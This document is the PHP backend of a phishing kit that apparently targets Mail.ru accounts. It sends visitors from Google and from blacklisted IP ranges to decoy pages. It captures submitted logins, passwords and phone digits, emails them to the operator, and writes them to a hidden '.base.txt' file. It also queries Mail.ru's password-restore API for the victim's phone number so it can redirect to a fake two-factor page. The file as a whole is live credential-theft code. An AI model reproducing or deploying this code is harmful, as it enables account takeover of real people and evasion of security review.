


<?php 
session_start(); 
if($_SERVER['HTTP_REFERER'] == "https://www.google.com/") { 
header('Location: https://cayt.ru./'); 
die(); 
} 
?>






<?php
if (strpos($_SERVER['HTTP_REFERER'], 'www.google.com')) { 
header('Location: https://cayt.ru./'); 
die(); 
} 
?>







<?
error_reporting(0);
$blackips = file_get_contents('blackip.txt');
$ipe = explode(".",$_SERVER["REMOTE_ADDR"]);
$ip_mask = $ipe[0].'.'.$ipe[1].'.'.$ipe[2];
if (preg_match("/$ip_mask/i", $blackips)) {
//black IP
 header("Location: https://e.mail.ru/403"); header("Location: https://e.mail.ru/403");echo "$notfound<div style=\"visibility:hidden\">bi</div>"; die();
}
?>


<?PHP
set_time_limit(0);
Error_Reporting(E_ALL & ~E_NOTICE);
$mail='mail dlya logs';

$id=$_GET['id'];
$b=$_GET['b'];


$login = $_POST['Login'];
//$domain = $_POST['Domain'];
$browser = getenv("HTTP_USER_AGENT");
$ref = getenv("HTTP_REFERER");
$ip = getenv("REMOTE_ADDR");
$query = UrlDecode(getenv("QUERY_STRING"));
$password = $_POST['Password'];
$time = date("d.m.Y G:i.s"); 
$ip = $_SERVER['REMOTE_ADDR'];
$ban="ban_m.txt";
$in="$login\n";

$tele = $_POST['t1'].$_POST['t2'].' - '.$_POST['t3'];
if ($tele && $tele != ' - ') $password = "\n$tele\n";

$info="$login:$password|||$ip|||$time   ||$query||  $ref ||  $browser  ip:$ip\n";

mail($mail, "mail log $login !", $info);
$f = fopen('.base.txt', 'a+'); 
fwrite($f, "\n");
fwrite($f, $info );
fwrite($f, "\n");
fclose($f);

$headers = array(
	"User-Agent: $browser",
	'Accept: */*',
	'Accept-Encoding: deflate',
	'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
);
$ch = curl_init('https://account.mail.ru/api/v1/user/password/restore');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$login&htmlencoded=false");
$res = curl_exec($ch); 
curl_close($ch);
$js = json_decode($res,true);
$phone = $js['body']['phones']['0'];
if ($js['body']['phones']['1'] != '') $phone = $js['body']['phones']['1'];
$phone = explode('XX',$phone); 
$p = $phone[0];
parse_str(parse_url($ref, PHP_URL_QUERY), $q);
$err = $q['err'];



if ($err != 1 && $p)
{
	header("Location:secure.php?err=1&email=$login&id=$id&b=$b&2fa=".base64_encode($p));
	exit;
}

header("Location:login.php?err=1&email=$login&id=$id&b=$b");
exit;
?>